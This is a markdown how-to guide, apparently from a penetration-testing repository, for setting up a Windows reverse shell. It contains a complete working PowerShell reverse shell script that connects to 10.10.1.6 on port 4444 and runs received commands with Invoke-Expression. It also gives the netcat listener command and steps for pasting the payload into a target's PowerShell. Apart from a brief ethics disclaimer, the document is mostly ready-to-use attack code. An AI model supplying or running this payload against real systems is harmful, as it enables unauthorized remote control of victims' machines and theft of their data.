### **Reverse Shell Setup & Execution Guide**

## **Overview**
This document provides instructions for setting up and using a **Windows Reverse Shell** to connect from a target Windows machine back to an attacker's machine. The reverse shell allows an attacker to remotely execute commands on the target system by initiating a connection from the target to the attackerâ€™s listener.

### **Important Disclaimer**
This tool is intended for ethical penetration testing, security research, or authorized security assessments only. Unauthorized use is illegal and unethical. Always obtain explicit permission before testing any system.

## **Requirements**
### **Attacker Machine**
1. **Netcat** or any other listener for receiving connections from the target system.
   - Use `nc` (Netcat) to listen for incoming connections:
     ```shell
     nc -lvnp 4444
     ```

2. **PowerShell** (on the target machine):
   - The script uses PowerShell to execute commands on the target system.

### **Target Machine (Windows)**
- Windows PowerShell, which is available on most modern versions of Windows.
  
## **Payload Script Explanation**

### **PowerShell Reverse Shell Script:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.1.6', 4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535 | % { 0 };
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
};
$client.Close();
```

### **Explanation:**
1. **TCP Connection**: The reverse shell creates a TCP connection to the attacker's machine using the specified IP (`10.10.1.6`) and port (`4444`).
2. **Data Stream**: Once connected, it listens for commands and executes them using `iex` (Invoke-Expression).
3. **Command Output**: The result of each command is sent back to the attacker, and this process continues until the connection is closed.

## **Setup Instructions**

### **Step 1: Set Up Listener on Attacker Machine**
On your Kali (attacker) machine, open a terminal and start a listener to receive the incoming reverse shell connection:
```bash
nc -lvnp 4444
```
This will start Netcat on port `4444`, listening for incoming connections from the target machine.

### **Step 2: Deliver the Payload to Target Machine**
 **Manual Execution**: 
   You can manually execute the script on the target machine by copying and pasting it into a PowerShell window.
